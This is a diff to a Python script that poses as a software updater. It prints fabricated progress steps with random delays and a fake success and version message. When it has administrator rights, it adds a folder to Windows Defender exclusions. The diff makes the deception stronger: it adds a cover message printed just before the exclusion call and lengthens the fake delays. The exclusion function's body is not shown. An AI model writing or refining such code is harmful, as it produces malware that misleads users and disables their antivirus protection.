@@ -27,7 +27,6 @@ class Main:
     
     def perform_update(self):
         steps = [
-            "Checking for updates...",
             "Resolving dependencies...",
             "Downloading package metadata...",
             "Installing collected packages...",
@@ -37,7 +36,7 @@ class Main:
 
         for step in steps:
             print(step)
-            time.sleep(random.uniform(0.5, 2.5)) # Simulate time taken for each step
+            time.sleep(random.uniform(1, 4.5)) # Simulate time taken for each step
 
         print("\nSuccessfully installed updates.")
         print("Current version: 3.11.6")
@@ -49,6 +48,7 @@ class Main:
 if __name__ == "__main__":
     self = Main()
     if is_admin:
+        print("Gathering dependencies and preparing for update...")
         self.add_folder_to_windows_defender_exclusions()
         self.perform_update()
         exit(0)
